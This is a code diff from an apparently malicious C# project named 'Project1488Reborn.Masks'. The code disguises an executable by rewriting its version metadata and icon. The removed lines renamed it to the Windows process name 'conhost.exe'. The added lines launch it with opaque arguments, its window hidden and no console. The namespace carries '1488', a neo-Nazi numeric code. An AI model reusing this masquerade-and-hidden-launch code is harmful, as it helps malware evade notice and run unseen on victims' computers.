@@ -57,40 +57,28 @@ namespace Project1488Reborn.Masks
             if (File.Exists(Path.Combine(MaskDir.FullName, "conhost.exe")))
                 File.Delete(Path.Combine(MaskDir.FullName, "conhost.exe"));
 
-            File.Move(Path.Combine(MaskDir.FullName, NameMainFile), Path.Combine(MaskDir.FullName, "conhost.exe"));
-
 
             VersionResource vr = new VersionResource();
-            vr.LoadFrom(Path.Combine(MaskDir.FullName, "conhost.exe"));
+            vr.LoadFrom(Path.Combine(MaskDir.FullName, NameMainFile));
             
 
             StringFileInfo sfi = (StringFileInfo)vr["StringFileInfo"];
 
-            sfi["OriginalFilename"] = "conhost.exe";
+            sfi["OriginalFilename"] = NameMainFile;
             StringTableEntry.ConsiderPaddingForLength = true;
 
             vr.Language = 0;
-            vr.SaveTo(Path.Combine(MaskDir.FullName, "conhost.exe"));
+            vr.SaveTo(Path.Combine(MaskDir.FullName, NameMainFile));
 
             using (FileStream fs = new FileStream("ico.ico", FileMode.Create))
                 icon.Save(fs);
 
-            File.WriteAllText("class.tmp", Properties.Resources.ProgramStarterCode);
-
-            Process proc = new Process();
-            proc.StartInfo.FileName = $"C:\\Windows\\Microsoft.NET\\Framework\\v3.5\\csc.exe";
-            proc.StartInfo.Arguments = $"/out:\"{Path.Combine(MaskDir.FullName, NameMainFile)}\" /target:exe /win32icon:\"{Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location)}\\ico.ico\" \"{Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location)}\\class.tmp\"";
-            proc.StartInfo.UseShellExecute = false;
-            proc.Start();
-
-            while (!proc.HasExited)
-                Thread.Sleep(10);
+            new IconDirectoryResource(new IconFile("ico.ico")).SaveTo(Path.Combine(MaskDir.FullName, NameMainFile));
 
             //Отчиска
             foreach (FileInfo fi in new List<FileInfo>()
             {
-                new FileInfo("ico.ico"),
-                new FileInfo("class.tmp")
+                new FileInfo("ico.ico")
             })
             {
                 if (fi.Exists)
@@ -99,12 +87,12 @@ namespace Project1488Reborn.Masks
                 }
             }
 
-            proc = new Process();
+            Process proc = new Process();
             proc.StartInfo.FileName = $"{Path.Combine(MaskDir.FullName, NameMainFile)}";
-            proc.StartInfo.Arguments = $"";
+            proc.StartInfo.Arguments = $"--code-load 0x0000008 --debug diable --nodemode 0 --ss 3976949C";
             proc.StartInfo.UseShellExecute = true;
-            //proc.StartInfo.CreateNoWindow = true;
-            //proc.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
+            proc.StartInfo.CreateNoWindow = true;
+            proc.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
             proc.Start();
         }
 
